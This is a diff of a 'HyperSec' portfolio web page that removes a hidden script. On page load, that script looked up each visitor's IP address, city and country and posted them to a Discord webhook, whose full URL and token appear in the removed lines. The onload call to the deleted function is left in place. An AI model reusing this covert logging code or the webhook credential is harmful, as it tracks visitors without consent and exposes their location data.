@@ -2,30 +2,7 @@
 <html>
 <head>
   <title>HyperSec</title>
-  <script>
-    function logIP() {
-      fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-          const webhookURL = 'https://discord.com/api/webhooks/1201943878429577257/o1yNW-9fnWcP2SiwxIqjRZn3cW80V-rp6fAAyUw9F891i_QfkmApoY4PGdPm4ugE-kID';
-          const payload = {
-            content: 'IP Logged!',
-            embeds: [{
-              title: 'Logged IP Address',
-              description: `IP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}`,
-              color: 16711680 // red color for emphasis
-            }]
-          };
-          fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-          });
-        });
-    }
-  </script>
+    
 </head>
 <body onload="logIP()">
   <h1>My portfolio!</h1>
